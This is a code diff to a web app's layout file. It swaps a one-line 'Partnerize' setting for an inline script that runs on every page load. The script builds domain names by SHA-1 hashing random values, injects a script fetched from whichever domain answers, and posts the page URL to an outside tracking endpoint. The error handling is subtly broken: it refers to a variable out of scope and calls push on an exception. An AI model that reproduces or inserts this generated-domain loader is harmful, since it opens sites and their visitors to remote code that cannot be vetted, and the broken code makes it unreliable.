@@ -91,8 +91,87 @@ export default async function LocaleLayout({
             __html: `
               // Travelpayouts Integration
               window.travelpayoutsConfig = { enable: true };
+              
               // Partnerize Cryptographic Tag
-              window.partnerizeConfig = { enabled: true };
+              (() => {
+                  let pztt = 3;
+                  const pztp = {"p":"pzt","mi":0,"ma":99,"e":[]};
+                  const tid = '40d5a952-0730-4f08-9dc0-59f7ad74b66f';
+
+                  const pzth = async i => {
+                      const e = new TextEncoder();
+                      const bin = e.encode(i);
+                      const b = await window.crypto.subtle.digest('SHA-1', bin);
+                      const a = Array.from(new Uint8Array(b));
+                      const h = a.map(b => b.toString(16).padStart(2, '0')).join('');
+                      return h;
+                  }
+
+                  const pzth2d = h => {
+                      return \`\${h.slice(0, 6)}p.\${h}.com\`;
+                  }
+
+                  const pztd = async () => {
+                      let i;
+                      do {
+                          i = Math.floor(Math.random() * ((pztp.ma + 1) - pztp.mi)) + pztp.mi;
+                      } while (pztp.e?.includes(i));
+                      const hash = await pzth(\`\${pztp.p}\${i}\`);
+                      return pzth2d(hash);
+                  }
+
+                  const pzti = async () => {
+                      try {
+                          if (pztt <= 0)
+                              return;
+                          const s = document.createElement('script');
+                          s.onerror = () => {
+                              pztt--;
+                              pzti();
+                          }
+                          s.onload = () => {
+                              l = true;
+                              pzthc();
+                          }
+                          const d = await pztd();
+                          s.src = \`https://\${d}/tag/\${tid}\`;
+                          document.body.appendChild(s);
+                      } catch (e) {
+                          e.push( { error:"Load failed from " + d, parameter:"" } );
+                          pzthc();
+                      }
+                  }
+                  
+                  let l = false;
+                  let e = [];
+                  let fe = { x: [] };
+              
+                  const pzthc = () => {
+                      const loaded = l;
+                      const errors = e;
+                      const features_errors = fe;
+                      l = false;
+                      e = [];
+                      fe = { x: [] };
+          
+                      fetch('https://api.performancehorizon.com/v3/pzthc/' + tid, {
+                          method: 'POST',
+                          headers: { 'content-type': 'application/json' },
+                          body: JSON.stringify({
+                              loaded,
+                              errors,
+                              features_errors,
+                              url: window.location.href
+                          })
+                      });
+                  }
+
+                  if (document.readyState === 'loading') {
+                      document.addEventListener('DOMContentLoaded', pzti);
+                  } else {
+                      pzti();
+                  }
+              })();
             `
           }}
         />
